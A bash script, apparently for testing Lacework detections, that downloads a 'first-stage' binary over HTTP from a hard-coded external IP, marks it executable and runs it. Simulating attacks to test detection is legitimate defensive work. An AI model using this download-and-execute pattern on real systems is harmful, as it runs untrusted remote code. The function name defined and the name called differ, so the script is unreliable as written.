#!/bin/bash
# Script to simulate activity that will trigger Lacework events

EXT_IP="54.184.116.123"
FILENAME="lw-binary"
BIN_URL="http://${EXT_IP}/first-stage/${FILENAME}"

download__exec_binary() {
        # Download the first stage binary
        echo "Downloading ${FILENAME}..."
        if [[ $(curl -s -w "%{http_code}\\n" -X GET ${BIN_URL} -o ${FILENAME}) -eq 200 ]]
        then
                echo " - Successfully downloaded ${FILENAME}!"
        else
                echo " - Failed to download ${FILENAME}!"
        fi
        echo "Done."

        # Change permissions so it can be executed
        echo "changing permissins on ${FILENAME} to allow execution..."
        chmod u+x ${FILENAME}
        if [[ $? -eq 0 ]]
        then
                echo " - Successfully changed permissions"
        else
                echo " - Failed to change permissions on ${FILENAME}!"
        fi
        echo "Done."

        # Execute the binary
        echo "Executing ${FILENAME}..."
        ./${FILENAME}
        if [[ $? -eq 0 ]]
        then
                echo " - Successfully executed ${FILENAME}!"
        else
                echo " - Failed to execute ${FILENAME}!"
        fi
        echo "Done."
}

download_exec_binary
echo "Script finished, terminating."
